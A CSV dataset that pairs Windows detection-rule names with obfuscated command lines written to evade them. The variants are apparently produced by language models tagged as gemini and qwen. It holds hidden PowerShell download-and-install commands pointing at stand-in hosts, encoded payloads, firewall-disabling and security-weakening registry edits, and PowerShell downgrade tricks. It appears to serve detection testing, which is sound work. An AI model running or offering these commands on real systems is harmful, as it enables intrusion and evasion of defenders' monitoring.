rule_name,commandline_evasion,row_count,sources
proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,"powershell.exe -""c"" ""New-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Outlook\Security' -Name 'EnableUnsafeClientMailRules' -Value 1 -PropertyType DWORD""",3,gemini:2; qwen32b
proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,"powershell.exe -C ""New-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Outlook\Security' -Name 'EnableUnsafeClientMailRules' -Value 1 -PropertyType DWORD""",5,gemini:4; qwen32b
proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,"powershell.exe -Command ""New-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Outlook\Security' -Name 'EnableUnsafeClientMailRules' -Value 1 -PropertyType DWORD""",5,gemini:4; qwen32b
proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,"powershell.exe -c ""New-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Outlook\Security' -Name 'EnableUnsafeClientMailRules' -Value 1 -PropertyType DWORD""",5,gemini:4; qwen32b
proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,"reg.exe add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v EnableUnsafeClientMailRules /t REG_DWORD /d 1 /f",3,gemini:2; qwen32b
proc_creation_win_office_outlook_enable_unsafe_client_mail_rules,"set ""p1=EnableUnsafe"" && set ""p2=ClientMailRules"" && reg add ""HKCU\Software\Policies\Microsoft\Office\16.0\Outlook\Security"" /v %p1%%p2% /t REG_DWORD /d 1 /f",5,gemini:4; qwen32b
proc_creation_win_ping_hex_ip,ping -n 1 127.0.0.1,1,qwen14b
proc_creation_win_ping_hex_ip,ping -n 1 192.168.1.1,1,qwen14b
proc_creation_win_ping_hex_ip,ping 0177.0000.0000.0001,2,gemini:2
proc_creation_win_ping_hex_ip,ping 192.168.1.1,1,qwen14b
proc_creation_win_powershell_audio_capture,"powershell.exe -Command ""Import-Module AudioDeviceCmdlets; $func = 'Get-AudioDevice'; & $func -List""",2,gemini; qwen32b
proc_creation_win_powershell_base64_frombase64string,"powershell.exe -""Command"" ""$method = 'From' + 'Base64String'; $payload = [Convert]::$method('d2hvYW1p'); [System.Text.Encoding]::UTF8.GetString($payload) | Invoke-Expression""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_frombase64string,"powershell.exe -COmMAND ""$method = 'From' + 'Base64String'; $payload = [Convert]::$method('d2hvYW1p'); [System.Text.Encoding]::UTF8.GetString($payload) | Invoke-Expression""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_frombase64string,"powershell.exe -Command ""$method = 'From' + 'Base64String'; $payload = [Convert]::$method('d2hvYW1p'); [System.Text.Encoding]::UTF8.GetString($payload) | Invoke-Expression""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_frombase64string,"powershell.exe -c ""$method = 'From' + 'Base64String'; $payload = [Convert]::$method('d2hvYW1p'); [System.Text.Encoding]::UTF8.GetString($payload) | Invoke-Expression""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_invoke,"powershell.exe /""Command"" ""IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLVdlYlJlcXVlc3QgLWVjaG8=')))""",2,gemini; qwen32b
proc_creation_win_powershell_base64_invoke,"powershell.exe /""e"" SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAMQAiAA==",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_invoke,powershell.exe /E SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAMQAiAA==,5,gemini:4; qwen32b
proc_creation_win_powershell_base64_invoke,powershell.exe /e SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAMQAiAA==,5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load,"powershell.exe -""EncodedCommand"" WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AGAAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AC4ATABvAGEAZAAo",2,gemini:2
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -""Command"" ""[Reflection.Assembly]::("" {1}{0}"" -""f"" 'oad' ,'L').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -""Command"" ""[Reflection.Assembly]::("" {1}{0}"" -F 'oad' ,'L').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -COMmAND ""$m = 'Load'; [Reflection.Assembly]::$m.Invoke($data)""",4,gemini:4
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -CoMManD ""[Reflection.Assembly]::('L'+'o'+'ad').Invoke($data)""",4,gemini:4
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -CoMMand ""$m = 'Load'; [Reflection.Assembly]::$m.Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -CommaND ""[Reflection.Assembly]::('L'+'o'+'ad').Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -Command ""$m = 'Load'; [Reflection.Assembly]::$m.Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -Command ""[Reflection.Assembly]::(""{1}{0}"" -f 'oad','L').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -Command ""[Reflection.Assembly]::('L'+'o'+'ad').Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -c ""$m = 'Load'; [Reflection.Assembly]::$m.Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -c ""[Reflection.Assembly]::("" {1}{0}"" -F 'oad' ,'L').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -c ""[Reflection.Assembly]::("" {1}{0}"" -f 'oad' ,'L').Invoke($data)""",2,gemini:2
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -c ""[Reflection.Assembly]::('L'+'o'+'ad').Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -cOmmanD ""$m = 'Load'; [Reflection.Assembly]::$m.Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -coMMANd ""[Reflection.Assembly]::("" {1}{0}"" -F 'oad' ,'L').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -coMMaNd ""[Reflection.Assembly]::("" {1}{0}"" -f 'oad' ,'L').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe -command ""[Reflection.Assembly]::('L'+'o'+'ad').Invoke($data)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe /""Command"" ""$m = 'Load'; [Reflection.Assembly]::$m.Invoke($data)""",2,gemini:2
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe /""Command"" ""[Reflection.Assembly]::("" {1}{0}"" -F 'oad' ,'L').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_reflection_assembly_load_obfusc,"powershell.exe /""Command"" ""[Reflection.Assembly]::('L'+'o'+'ad').Invoke($data)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -""EncodedCommand"" JABjACAAPQAgACcAVwBpAG4AMwAyAF8AJwAgACsAIAAnAFAAcgBvAGMAZQBzAHMAJwA7ACAASQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAJABjACAALQBOAGEAbQBlACAAQwByAGUAYQB0AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAEkAcwB0ACAAIgBjAGEAbABjAC4AZQB4AGUAIgA=",2,gemini:2
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAdwBJAG4AMwAyAF8AcAByAE8AYwBlAFMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABJAHMAdAAgACIAYwBhAGwAYwAuAGUAeABlACIA",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -""e"" JABjAGwAYQBzAHMAIAAoAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAgAC0AEwAaQBzAHQAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAJABfAC4ATgBhAG0AZQAgAC0AbQBhAHQAYwBoACAAIgBeAFcAaQBuADMAMgBfAFMAaABhAGQAbwB3AEMAbwBwAHkAJAAiAH0AKQAuAE4AYQBtAGUA",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -CoMmAND ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -Command ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -Command ""Get-WmiObject -Class Win32_Process""",3,qwen14b:2; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -Command ""Get-WmiObject -Class Win32_ShadowCopy | ConvertTo-Json""",3,qwen14b:2; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -c ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -coMmANd ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -comMAND ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -commANd ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe -commAnD ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",5,gemini:4; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe /""Command"" ""$w='Win32\_'; $p='Process'; Get-CimInstance -ClassName ($w+$p)""",3,gemini:2; qwen32b
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe /""EncodedCommand"" JABjACAAPQAgACcAVwBpAG4AMwAyAF8AJwAgACsAIAAnAFAAcgBvAGMAZQBzAHMAJwA7ACAASQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAJABjACAALQBOAGEAbQBlACAAQwByAGUAYQB0AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAEkAcwB0ACAAIgBjAGEAbABjAC4AZQB4AGUAIgA=",2,gemini:2
proc_creation_win_powershell_base64_wmi_classes,"powershell.exe /""EncodedCommand"" SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AQwBsAGEAcwBzACAAdwBJAG4AMwAyAF8AcAByAE8AYwBlAFMAcwAgAC0ATgBhAG0AZQAgAEMAcgBlAGEAdABlACAALQBBAHIAZwB1AG0AZQBuAHQATABJAHMAdAAgACIAYwBhAGwAYwAuAGUAeABlACIA",2,gemini:2
proc_creation_win_powershell_cl_invocation,"powershell.exe -ExecutionPolicy Bypass -Command ""Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; & $method 'calc.exe' ' '""",1,gemini
proc_creation_win_powershell_cl_invocation,"powershell.exe -ExecutionPolicy Bypass -Command ""Import-Module 'CL_Invocation.ps1'; $method = 'Sync' + 'Invoke'; & $method calc.exe ' '""",1,gemini
proc_creation_win_powershell_cl_invocation,"powershell.exe -ExecutionPolicy Bypass -Command ""Import-Module 'CL_Invocation.ps1'; $method = 'SyncInvoke'; & $method 'calc.exe' ' '""",1,gemini
proc_creation_win_powershell_cmdline_convertto_securestring,"powershell.exe -""EncodedCommand"" Q29udmVydFRvLVNlY3VyZVN0cmluZyAtU3RyaW5nICdQYXNzd29yZCcgLUFzUGxhaW5UZXh0IC1Gb3JjZQ==",3,gemini:2; qwen32b
proc_creation_win_powershell_cmdline_convertto_securestring,"powershell.exe -Command ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force""",5,gemini:4; qwen32b
proc_creation_win_powershell_cmdline_convertto_securestring,"powershell.exe /""Command"" ""$a='ConvertTo-'; $b='SecureString'; $c=$a+$b; &$c -String 'MySecret' -AsPlainText -Force""",3,gemini:2; qwen32b
proc_creation_win_powershell_cmdline_reversed_strings,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiAA==",3,gemini:2; qwen32b
proc_creation_win_powershell_cmdline_reversed_strings,"powershell.exe -Command ""Get-Process | Where-Object { $_.ProcessName -eq 'notepad' } | Format-List""",2,qwen14b:2
proc_creation_win_powershell_cmdline_reversed_strings,"powershell.exe -Command 'Write-Host (""tnirP"").tostring().reverse()'",2,qwen32b:2
proc_creation_win_powershell_cmdline_reversed_strings,"powershell.exe /""EncodedCommand"" SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAiAA==",3,gemini:2; qwen32b
proc_creation_win_powershell_cmdline_special_characters,"powershell.exe -Command ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')""",5,gemini:4; qwen32b
proc_creation_win_powershell_cmdline_special_characters,"powershell.exe -c ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')""",5,gemini:4; qwen32b
proc_creation_win_powershell_cmdline_special_characters,"powershell.exe -comMAnD ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')""",5,gemini:4; qwen32b
proc_creation_win_powershell_cmdline_special_characters,"powershell.exe /""Command"" ""& ( '{0}{1}{2}' -f 'I','EX','' ) ('Wri'+'te-H'+'ost ''Bypass''')""",3,gemini:2; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe -""EncodedCommand"" JAB1AD0AJwBoAHQAcABzADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvACcAOwAkAGkAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAoACcAaQBuAGQAbwB3AHMASQBuAHMAdABhAGwAbABlAHIALgBJAG4AcwB0AGEAbABsAGUAcgAnAC4ASQBuAHMAZQByAHQAKAAwACwAJwBXACcAKQApADsAJABpAC4AVQBJAEwAZQB2AGUAbAA9ADIAOwAkAGkALgBJAG4AcwB0AGEAbABsAFAAcgBvAGQAdQBjAHQAKAAkACgAaQBmACgAJAB1AC4AUwB0AGEAcgB0AHMAVwBpAHQAaAAoACcAaAB0AHAAcwA6AC8ALwAnACkAKQB7ACQAdQAuAEkAbgBzAGUAcgB0ACgAMgAsACcAdAAnACkAfQBlAGwAcwBlAHsAJAB1AH0AKQAsACcAJwApADsA",3,gemini:2; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe -C ""$u='htps://example.com/';$i=[activator]::CreateInstance([type]::GetTypeFromProgID('indowsInstaller.Installer'.Insert(0,'W')));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')""",2,qwen32b:2
proc_creation_win_powershell_comobject_msi,"powershell.exe -w hidden -""c"" ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')""",3,gemini:2; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe -w hidden -C ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')""",7,gemini:6; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe -w hidden -Command ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')""",7,gemini:6; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe -w hidden -c ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('http://example.com/payload.msi', '')""",3,gemini:2; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe -w hidden -c ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')""",7,gemini:6; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe -w hidden /""c"" ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')""",3,gemini:2; qwen32b
proc_creation_win_powershell_comobject_msi,"powershell.exe /""w"" hidden -c ""$type=[type]::GetTypeFromProgID('WindowsInstaller.Installer'); $inst=[Activator]::CreateInstance($type); $inst.UILevel=2; $inst.InstallProduct('https://example.com/payload.msi', '')""",3,gemini:2; qwen32b
proc_creation_win_powershell_comobject_msi_remote,"powershell.exe -C ""$u='http://malicious.site/payload.msi'; $i=[activator]::CreateInstance([type]::GetTypeFromProgID('WindowsInstaller.Installer')); $i.InstallProduct($u)""",3,qwen32b:3
proc_creation_win_powershell_comobject_msi_remote,"powershell.exe -W Hidden -C ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')""",10,gemini:9; qwen32b
proc_creation_win_powershell_comobject_msi_remote,"powershell.exe -W Hidden -c ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')""",10,gemini:9; qwen32b
proc_creation_win_powershell_comobject_msi_remote,"powershell.exe -W Hidden /""C"" ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')""",4,gemini:3; qwen32b
proc_creation_win_powershell_comobject_msi_remote,"powershell.exe -w Hidden -C ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')""",10,gemini:9; qwen32b
proc_creation_win_powershell_comobject_msi_remote,"powershell.exe -w Hidden /""C"" ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')""",4,gemini:3; qwen32b
proc_creation_win_powershell_comobject_msi_remote,"powershell.exe /""W"" Hidden -""C"" ""$u='ht'+'tps://example.com/';$i=New-Object -Com ('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct ( $u,'')""",4,gemini:3; qwen32b
proc_creation_win_powershell_create_service,"powershell.exe -Command ""N`ew-Service -Name 'TestService' -BinaryPathName 'cmd.exe' -StartupType Manual""",2,gemini:2
proc_creation_win_powershell_create_service,"powershell.exe -Command ""New-Service -Name 'TestService' -bin 'cmd.exe' -StartupType Manual""",2,gemini:2
proc_creation_win_powershell_create_service,powershell.exe -c New-Service -Name svcHighPriv -Bin 'C:\windows\system32\cmd.exe' -StartupType Manual,2,gemini:2
proc_creation_win_powershell_create_service,"powershell.exe -c New-Service -Name svcHighPriv -BinaryPath""""Name 'C:\windows\system32\cmd.exe' -StartupType Manual",2,gemini:2
proc_creation_win_powershell_disable_firewall,"powershell -Command ""& {Set-NetFirewallProfile -Enabled $false -All}""",2,gemini; qwen32b
proc_creation_win_powershell_disable_firewall,"powershell.exe ""Set-NetFirewallProfile -Enabled False -All""",1,qwen32b
proc_creation_win_powershell_disable_firewall,"powershell.exe -Command ""Set-NetFirewallProfile -Enabled $false  -Private""",2,gemini; qwen32b
proc_creation_win_powershell_disable_firewall,powershell.exe -Command Set-NetFirewallProfile -Enabled False -All,1,qwen32b
proc_creation_win_powershell_disable_firewall,powershell.exe -Command Set-NetFirewallProfile -Profile Private -Enabled:0,1,gemini
proc_creation_win_powershell_disable_firewall,powershell.exe -Command Set-NetFirewallProfile -Profile Public -Enabled $false,1,gemini
proc_creation_win_powershell_disable_firewall,powershell.exe Set-NetFirewallProfile -Enabled False -All,2,qwen32b:2
proc_creation_win_powershell_disable_firewall,"powershell_ise.exe -Command ""Set-NetFirewallProfile -Enabled:$false -Domain""",1,gemini
proc_creation_win_powershell_disable_ie_features,"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -Name ""DisableFirstRunCustomize"" -Value 2 -PropertyType DWord",1,gemini
proc_creation_win_powershell_disable_ie_features,"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -PropertyType DWord -Name ""DisableFirstRunCustomize`"" -Value 2",2,gemini; qwen32b
proc_creation_win_powershell_disable_ie_features,New-ItemProperty -Path 'HKCU\Software\Microsoft\Internet Explorer\Main' -PropertyType DWord -Name 'DisableFirstRunCustomize' -Value 2,1,gemini
proc_creation_win_powershell_disable_ie_features,"powershell -Command ""Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Internet Explorer\\Main' -name 'IEHarden'  -value 0 -Force""",1,gemini
proc_creation_win_powershell_downgrade_attack,"powershell.exe -""v"" 2-Command ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -Command ""Get-Date"" -v 2",2,qwen14b:2
proc_creation_win_powershell_downgrade_attack,"powershell.exe -V 2-Command ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -VERsION 2.0 -c ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -VErsION 2.0 -COmManD ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -VerSIoN 2.0 -c ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -VerSiOn 2.0 -coMmAND ""Write-Host 'Bypass'""",2,gemini:2
proc_creation_win_powershell_downgrade_attack,"powershell.exe -Version 2-Command ""Write-Host 'Bypass'""",2,gemini:2
proc_creation_win_powershell_downgrade_attack,"powershell.exe -Version 2.0 -Command ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,powershell.exe -v 2,2,qwen32b:2
proc_creation_win_powershell_downgrade_attack,"powershell.exe -v 2-Command ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -v 2.0 -ComMAnd ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -v 2.0 -c ""Write-Host 'Bypass'""",3,gemini:2; qwen32b
proc_creation_win_powershell_downgrade_attack,"powershell.exe -v 2.0 -cOmmAnd ""Write-Host 'Bypass'""",2,gemini:2
proc_creation_win_powershell_downgrade_attack,"powershell.exe -v 2.0 /""Command"" ""Write-Host 'Bypass'""",2,gemini:2
proc_creation_win_powershell_downgrade_attack,powershell.exe -ve 2,2,qwen32b:2
proc_creation_win_powershell_downgrade_attack,powershell.exe -ver 2,2,qwen32b:2
proc_creation_win_powershell_downgrade_attack,powershell.exe -vers 2,2,qwen32b:2
proc_creation_win_powershell_downgrade_attack,powershell.exe -versi 2,2,qwen32b:2
proc_creation_win_powershell_downgrade_attack,powershell.exe -versio 2,2,qwen32b:2
proc_creation_win_powershell_downgrade_attack,powershell.exe -version 2,2,qwen32b:2
proc_creation_win_powershell_download_iex,"powershell.exe -c ""irm test.domain/ffe | .((Get-Variable *md*).Value.Name[3,11,2]-join'')""",2,gemini; qwen32b
proc_creation_win_powershell_download_patterns,"powershell.exe -COmmANd ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')""",1,gemini
proc_creation_win_powershell_download_patterns,"powershell.exe -ComMaNd ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')""",2,gemini; qwen32b
proc_creation_win_powershell_download_patterns,"powershell.exe -Command ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')""",2,gemini; qwen32b
proc_creation_win_powershell_download_patterns,"powershell.exe -c ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')""",1,gemini
proc_creation_win_powershell_download_patterns,"powershell.exe -commanD ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')""",2,gemini; qwen32b
proc_creation_win_powershell_download_patterns,"powershell.exe -command ""(New-Object Net.WebC`lient).DownloadString('http://example.com/script.ps1')""",1,gemini
proc_creation_win_powershell_encode,"powershell.exe -Command ""Write-Host 'Hello, Lab!'""",1,qwen14b
proc_creation_win_powershell_encode,"powershell.exe -NoProfile -Command ""Write-Host 'Hello, Lab!'""",1,qwen14b
proc_creation_win_powershell_encode,powershell.exe /E JABoAG8AcwB0AG4AYQBtAGUA,1,gemini
proc_creation_win_powershell_encode,powershell.exe /e JABoAG8AcwB0AG4AYQBtAGUA,1,gemini
proc_creation_win_powershell_encoding_patterns,"powershell.exe -Command ""Get-Date""",2,qwen14b:2
proc_creation_win_powershell_encoding_patterns,"powershell.exe -Command ""Start-Process notepad.exe""",2,qwen14b:2
proc_creation_win_powershell_encoding_patterns,"powershell.exe -Command ""Write-Host 'Hello World'""",2,qwen14b:2
proc_creation_win_powershell_encoding_patterns,"powershell.exe /""ExecutionPolicy"" Bypass /""EncodedCommand"" V3JpdGUtSDBzdCAiQnlwYXNzZWQi",2,gemini:2
proc_creation_win_powershell_export_certificate,"powershell.exe -""Command"" ""$cmd = 'Export-' + 'PfxCertificate'; & $cmd -Cert $cert -FilePath C:\temp\cert.pfx""",2,gemini:2
proc_creation_win_powershell_export_certificate,"powershell.exe -""Command"" ""& 'Export-PfxCertificate' -Cert $cert -FilePath C:\temp\cert.pfx""",3,gemini:2; qwen32b
